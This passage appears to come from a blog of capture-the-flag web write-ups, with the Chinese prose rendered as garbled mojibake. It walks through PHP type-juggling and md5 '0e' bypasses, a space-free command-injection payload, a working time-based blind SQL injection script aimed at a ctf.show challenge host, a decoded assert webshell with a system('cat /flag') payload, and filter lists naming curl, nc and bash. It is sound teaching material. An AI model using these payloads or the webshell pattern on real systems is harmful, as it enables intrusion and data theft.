&#125;else&#123;</span><br><span class="line">        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯ä¼ å…¥numï¼Œç»è¿‡intvalå’Œåå‘å†intvalåç›¸ç­‰ï¼Œä¸”åŸå§‹numä¸æ˜¯å›æ–‡</p>
<p>é™å®š0-9.-</p>
<p>intvalæ˜¯è½¬intçš„ä¸€ä¸ªå‡½æ•°ï¼Œä¼šå°†æµ®ç‚¹å–æ•´ï¼Œå­—ç¬¦å–å¼€å¤´æ•°å­—</p>
<p>æœ‰äº†æç¤ºçš„.-å¾ˆå®¹æ˜“æƒ³åˆ°ä¸€ä¸ªpayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=1.10</span><br><span class="line">intval-&gt;1;strrev-&gt;01.1-&gt;intval-&gt;1;éå›æ–‡</span><br></pre></td></tr></table></figure>

<p>level2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">    $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">    if ($md5==md5(md5($md5)))</span><br><span class="line">        echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒé‡md5ä¹‹åç›¸ç­‰ï¼Œæ˜æ˜¾è¦æ±‚md5ç»•è¿‡ï¼Œæ‰¾åˆ°ä¸¤æ¬¡md5ä¹‹åéƒ½æ˜¯0eå¼€å¤´å³å¯</p>
<p>0eå¼€å¤´å¼±æ¯”è¾ƒä¼šè®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œ0çš„næ¬¡æ–¹ç­‰äº0çš„mæ¬¡æ–¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5_hash(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in range(1000000000001):</span><br><span class="line">    original_str = &quot;0e&quot; + str(i)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    first_hash = md5_hash(original_str)</span><br><span class="line">    second_hash = md5_hash(first_hash)</span><br><span class="line">    </span><br><span class="line">    if second_hash.startswith(&quot;0e&quot;) and second_hash[2:].isdigit():</span><br><span class="line">        print(original_str)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?md5=0e3900184182</span><br></pre></td></tr></table></figure>

<p>level3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¿«åˆ°éæ´²äº†&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€ç®€å•çš„ä¸€é›†ï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼Œä¸èƒ½æœ‰ä¸Šé¢çš„å…³é”®è¯</p>
<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctfé‡Œè¯»å–æ–‡ä»¶ç›¸å…³çŸ¥è¯†ç‚¹æ€»ç»“</a></p>
<p>ç©ºæ ¼å¯ä»¥ç”¨&lt;æˆ–è€…åˆ¶è¡¨ç¬¦(Tab)ä»£æ›¿ï¼Œè¯»å–ç›´æ¥nl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?get_flag=nl&lt;/flag</span><br><span class="line">?get_flag=nl	/flag</span><br></pre></td></tr></table></figure>

<h2 id="Login-Only-For-36D"><a href="#Login-Only-For-36D" class="headerlink" title="Login_Only_For_36D"></a>Login_Only_For_36D</h2><p>F12æç¤º</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402062107206.png" alt="image-20240206210743134"></p>
<p>nameå‚æ•°é‡Œå¿…é¡»å¸¦adminï¼Œfuzzä¹‹åè¢«banäº†æŒºå¤š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;-&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27; &#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;updatexml&#x27;, &#x27;floor&#x27;, &#x27;rand&#x27;, &#x27;substr&#x27;, &#x27;mid&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;&amp;&amp;&#x27;]</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨<code>/</code>ï¼Œå°†adminåé¢çš„<code>&#39;</code>æ³¨é‡Šæ‰ï¼Œè¾¾åˆ°è¿™æ ·çš„æ•ˆæœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1\&amp;pass=test</span><br><span class="line">-&gt;</span><br><span class="line">select * from 36d_user where username=&#x27;1\&#x27; and password=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥æ•°æ®åº“æŸ¥è¯¢çš„usernameå³ä¸º<code>1\&#39; and password=</code>ï¼Œç”±äºæ— å›æ˜¾ï¼Œç›²æ³¨å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://9420c6ec-8845-43b4-b94f-e1aa0543c453.challenge.ctf.show/index.php&quot;</span><br><span class="line">username = &quot;admin\\&quot;</span><br><span class="line">alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">            &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">            &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 30):</span><br><span class="line">    for al in alphabet:</span><br><span class="line">        a_int = ord(al)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: username,</span><br><span class="line">            &#x27;password&#x27;: f&quot;or/**/if((ord(right(left(password,&#123;i&#125;),1))/**/in/**/(&#123;a_int&#125;)),sleep(3),1)#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=3)</span><br><span class="line">        except:</span><br><span class="line">            flag += chr(a_int)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="ä½ å–å§"><a href="#ä½ å–å§" class="headerlink" title="ä½ å–å§"></a>ä½ å–å§</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);</span><br><span class="line">$code=$_REQUEST[&#x27;code&#x27;];</span><br><span class="line">$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\~&#x27;,&#x27;\^&#x27;);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line">foreach ($blacklist as $blacklisted) &#123;</span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123;</span><br><span class="line">        die(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval(&quot;echo($code);&quot;);</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚ä¸ä½¿ç”¨å­—æ¯å–åå¼‚æˆ–echoå‡ºä¸œè¥¿ï¼Œè§£æ³•å¾ˆå¤š</p>
<p>é¢„æœŸè§£æ˜¯è®¿é—®<code>$_</code>ä¸­çš„é”®å€¼æ‹¼æ¥ï¼Œæœ€åç”¨<code>$&#123;&#125;</code>æ„æˆ$hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;$_&#123;7&#125;.$_&#123;8&#125;.$_&#123;12&#125;.$_&#123;19&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰Pç‰›çš„æ— æ•°å­—webshellä¹Ÿèƒ½æ‰“</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p>
<p>æ‹¿åˆ°zipæºç ï¼Œç»è¿‡phpjiamiè·‘è¿‡ä¸€é</p>
<p>è¿˜æ˜¯Pç‰›</p>
<p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">phpjiami æ•°ç§è§£å¯†æ–¹æ³•</a></p>
<p>hook evalçš„æ’ä»¶æ²¡æˆåŠŸï¼Œdumpå‡ºæ¥çš„</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402071522756.png" alt="image-20240207152255636"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?php @eval(&quot;//Encode by  phpjiami.com,Free user.&quot;); ?&gt;&lt;?php</span><br><span class="line">$ch = explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);</span><br><span class="line">$c = $ch[1].$ch[5].$ch[4]; </span><br><span class="line">@$c($_POST[7-1]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php </span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯<code>assert($_POST[7-1]);)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">6=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>ç½‘ä¸Šè¿˜æŠ„äº†ä¸ªè§£å¯†è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data_1 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        if ($ch &lt; 245) &#123;</span><br><span class="line">            if ($ch &gt; 136) &#123;</span><br><span class="line">                $data_1 .= chr($ch / 2);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = 32;</span><br><span class="line">    $data_2 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        if ($j &lt;= 0) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    return $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_data($code)</span><br><span class="line">&#123;</span><br><span class="line">    $code_end = strrpos($code, &#x27;?&gt;&#x27;);</span><br><span class="line">    if (!$code_end) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + 2;</span><br><span class="line">    $data = substr($code, $data_start, -46);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_key($code)</span><br><span class="line">&#123;</span><br><span class="line">    // $v1 = $v2(&#x27;bWQ1&#x27;);</span><br><span class="line">    // $key1 = $v1(&#x27;??????&#x27;);</span><br><span class="line">    $pos1 = strpos($code, &quot;(&#x27;&quot; . preg_quote(base64_encode(&#x27;md5&#x27;)) . &quot;&#x27;);&quot;);</span><br><span class="line">    $pos2 = strrpos(substr($code, 0, $pos1), &#x27;$&#x27;);</span><br><span class="line">    $pos3 = strrpos(substr($code, 0, $pos2), &#x27;$&#x27;);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, &quot;(&#x27;&quot;, $pos4);</span><br><span class="line">    $pos6 = strpos($code, &quot;&#x27;)&quot;, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[1];</span><br><span class="line">$output_file = $argv[1] . &#x27;.decrypted.php&#x27;;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line">if (!$code) &#123;</span><br><span class="line">    echo &#x27;æœªæ‰¾åˆ°åŠ å¯†æ•°æ®&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &#x27;æœªæ‰¾åˆ°ç§˜é’¥&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line">// ç”±äºå¯ä»¥ä¸å‹¾é€‰ä»£ç å‹ç¼©çš„é€‰é¡¹ï¼Œæ‰€ä»¥è¿™é‡Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦è§£å‹æˆåŠŸï¼Œè§£å‹å¤±è´¥å°±æ˜¯æ²¡å‹ç¼©</span><br><span class="line">if ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line">echo &#x27;è§£å¯†åæ–‡ä»¶å·²å†™å…¥åˆ° &#x27;, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF-æœ´å®æ— å-Revenge-Revenge"><a href="#WUSTCTF-æœ´å®æ— å-Revenge-Revenge" class="headerlink" title="WUSTCTF_æœ´å®æ— å_Revenge_Revenge"></a>WUSTCTF_æœ´å®æ— å_Revenge_Revenge</h2><p>åªæœ‰level1å’Œgetflagæ”¹äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;éæ´²æ¬¢è¿ä½ 1&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( (preg_match_all(&quot;/\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123;</span><br><span class="line">            die(&quot;æ²¡æœ‰è¿™æ ·çš„æ•°&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($num != $numPositve) &#123;</span><br><span class="line">        die(&#x27;æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span><br><span class="line">        die(&quot;éæ´²æ¬¢è¿ä½ 2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªå…è®¸<code>0-9.</code>è¿˜åŠ äº†<code>$num != $numPositve</code>å°±æ˜¯è¦ä¼ å…¥çš„<code>num</code>å’Œintvalå¤„ç†åçš„<code>num</code>ç›¸ç­‰ï¼Œ</p>
<p>åˆ©ç”¨phpæµ®ç‚¹ç²¾åº¦</p>
<blockquote>
<p>æµ®ç‚¹æ•°çš„å­—é•¿å’Œå¹³å°ç›¸å…³ï¼Œå°½ç®¡é€šå¸¸æœ€å¤§å€¼æ˜¯ 1.8e308 å¹¶å…·æœ‰ 14 ä½åè¿›åˆ¶æ•°å­—çš„ç²¾åº¦ï¼ˆ64 ä½ IEEE æ ¼å¼ï¼‰ã€‚</p>
<p><strong>è­¦å‘Š</strong></p>
<h2 id="æµ®ç‚¹æ•°çš„ç²¾åº¦"><a href="#æµ®ç‚¹æ•°çš„ç²¾åº¦" class="headerlink" title="æµ®ç‚¹æ•°çš„ç²¾åº¦"></a>æµ®ç‚¹æ•°çš„ç²¾åº¦</h2><p>æµ®ç‚¹æ•°çš„ç²¾åº¦æœ‰é™ã€‚å°½ç®¡å–å†³äºç³»ç»Ÿï¼ŒPHP é€šå¸¸ä½¿ç”¨ IEEE 754 åŒç²¾åº¦æ ¼å¼ï¼Œåˆ™ç”±äºå–æ•´è€Œå¯¼è‡´çš„æœ€å¤§ç›¸å¯¹è¯¯å·®ä¸º 1.11e-16ã€‚éåŸºæœ¬æ•°å­¦è¿ç®—å¯èƒ½ä¼šç»™å‡ºæ›´å¤§è¯¯å·®ï¼Œå¹¶ä¸”è¦è€ƒè™‘åˆ°è¿›è¡Œå¤åˆè¿ç®—æ—¶çš„è¯¯å·®ä¼ é€’ã€‚</p>
<p>æ­¤å¤–ï¼Œä»¥åè¿›åˆ¶èƒ½å¤Ÿç²¾ç¡®è¡¨ç¤ºçš„æœ‰ç†æ•°å¦‚ <code>0.1</code> æˆ– <code>0.7</code>ï¼Œæ— è®ºæœ‰å¤šå°‘å°¾æ•°éƒ½ä¸èƒ½è¢«å†…éƒ¨æ‰€ä½¿ç”¨çš„äºŒè¿›åˆ¶ç²¾ç¡®è¡¨ç¤ºï¼Œå› æ­¤ä¸èƒ½åœ¨ä¸ä¸¢å¤±ä¸€ç‚¹ç‚¹ç²¾åº¦çš„æƒ…å†µä¸‹è½¬æ¢ä¸ºäºŒè¿›åˆ¶çš„æ ¼å¼ã€‚è¿™å°±ä¼šé€ æˆæ··ä¹±çš„ç»“æœï¼šä¾‹å¦‚ï¼Œ<code>floor((0.1+0.7)*10)</code> é€šå¸¸ä¼šè¿”å› <code>7</code> è€Œä¸æ˜¯é¢„æœŸä¸­çš„ <code>8</code>ï¼Œå› ä¸ºè¯¥ç»“æœå†…éƒ¨çš„è¡¨ç¤ºå…¶å®æ˜¯ç±»ä¼¼ <code>7.9999999999999991118...</code>ã€‚</p>
<p>æ‰€ä»¥æ°¸è¿œä¸è¦ç›¸ä¿¡æµ®ç‚¹æ•°ç»“æœç²¾ç¡®åˆ°äº†æœ€åä¸€ä½ï¼Œä¹Ÿæ°¸è¿œä¸è¦æ¯”è¾ƒä¸¤ä¸ªæµ®ç‚¹æ•°æ˜¯å¦ç›¸ç­‰ã€‚å¦‚æœç¡®å®éœ€è¦æ›´é«˜çš„ç²¾åº¦ï¼Œåº”è¯¥ä½¿ç”¨<a href="https://www.php.net/manual/zh/ref.bc.php">ä»»æ„ç²¾åº¦æ•°å­¦å‡½æ•°</a>æˆ–è€… <a href="https://www.php.net/manual/zh/ref.gmp.php">gmp å‡½æ•°</a>ã€‚</p>
<p>å‚è§<a href="http://floating-point-gui.de/">Â» æµ®ç‚¹æ•°æŒ‡å—</a>ç½‘é¡µçš„ç®€å•è§£é‡Šã€‚</p>
</blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(1.000000000000001 == 1);         # bool(false)</span><br><span class="line">var_dump(1.0000000000000001 == 1);        # bool(true)</span><br><span class="line">var_dump(1.0000000000000001 === 1);       # bool(false)</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†ç»•è¿‡å›æ–‡ï¼Œåè¾¹å†åŠ ä¸€ä¸ª0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010</span><br></pre></td></tr></table></figure>

<p>getflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        if (preg_match(&quot;/[&#x27;\*\&quot;[?]/&quot;, $get_flag)) &#123;</span><br><span class="line">            die(&#x27;éé¢„æœŸä¿®å¤*2&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¿«åˆ°éæ´²äº†&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠnlç»™banäº†ï¼Œç»§ç»­æŠ„ğŸ¶çˆ¹çš„</p>
<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctfé‡Œè¯»å–æ–‡ä»¶ç›¸å…³çŸ¥è¯†ç‚¹æ€»ç»“</a></p>
